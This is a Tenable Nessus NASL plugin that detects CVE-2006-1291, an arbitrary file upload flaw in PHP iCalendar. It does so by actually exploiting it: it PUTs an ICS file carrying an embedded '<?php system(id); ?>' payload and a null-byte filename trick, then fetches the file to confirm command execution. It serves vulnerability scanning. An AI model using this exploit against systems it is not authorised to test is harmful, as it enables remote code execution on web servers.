#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an arbitrary file upload vulnerability. 

Description :

The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The installed version of PHP iCalendar supports iCal publishing yet
does not properly restrict the types of files uploaded and places them
in a web-accessible directory.  An unauthenticated attacker can
leverage this issue to upload files with arbitrary PHP code and then
run that code subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that
'$phpicalendar_publishing' be enabled in 'config.inc.php', which is
not the default. 

See also :

http://www.nessus.org/u?1e9e4806

Solution :

Edit the application's 'config.inc.php' file and set
'$phpicalendar_publishing' to 0. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21091);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1291");
  script_bugtraq_id(17129);

  script_name(english:"PHP iCalendar Arbitrary File Upload Vulnerability");
  script_summary(english:"Tries to upload PHP code using PHP iCalendar");
 
  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Exploit data.
cmd = "id";
file = string(SCRIPT_NAME, "-", unixtime(), ".php");
ics = raw_string(
  "X-WR-CALNAME: ", file, 0x00, rand_str(), "\r\n",
  "\r\n",
  "<?php system(", cmd, "); ?>"
);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Upload the exploit.
  req = string(
    "PUT ", dir, "/calendars/publish.ical.php HTTP/1.0\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Length: ", strlen(ics), "\r\n",
    "Connection: Close\r\n",
    "\r\n",
    ics
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  # nb: the PHP script won't return anything.

  # Check whether the exploit worked.
  req = http_get(item:string(dir, "/calendars/", file), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem the output looks like it's from id.
  res = strstr(res, "uid=");
  if (res && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus was able to execute the command 'id' on the remote host;\n",
      "the output was:\n",
      "\n",
      res
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
